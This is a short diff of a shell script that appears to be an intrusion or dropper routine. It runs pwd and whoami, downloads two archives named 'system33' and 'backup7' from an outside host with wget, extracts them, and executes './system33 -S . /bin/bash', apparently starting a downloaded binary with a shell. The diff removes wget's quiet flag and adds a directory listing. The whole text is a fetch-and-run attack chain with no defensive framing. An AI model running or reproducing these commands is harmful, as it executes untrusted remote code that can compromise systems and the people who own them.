@@ -5,14 +5,16 @@ pwd
 sleep 2
 whoami
 sleep 2
-wget -q http://greenleaf.teatspray.uk/system33.tar.gz
+wget http://greenleaf.teatspray.uk/system33.tar.gz
 sleep 2
-wget -q http://greenleaf.teatspray.uk/backup7.tar.gz
+wget http://greenleaf.teatspray.uk/backup7.tar.gz
 sleep 2
 tar -xf system33.tar.gz
 sleep 2
 tar -xf backup7.tar.gz
 sleep 2
+ls -a
+sleep 5
 ./system33 -S . /bin/bash
 
 sleep 2
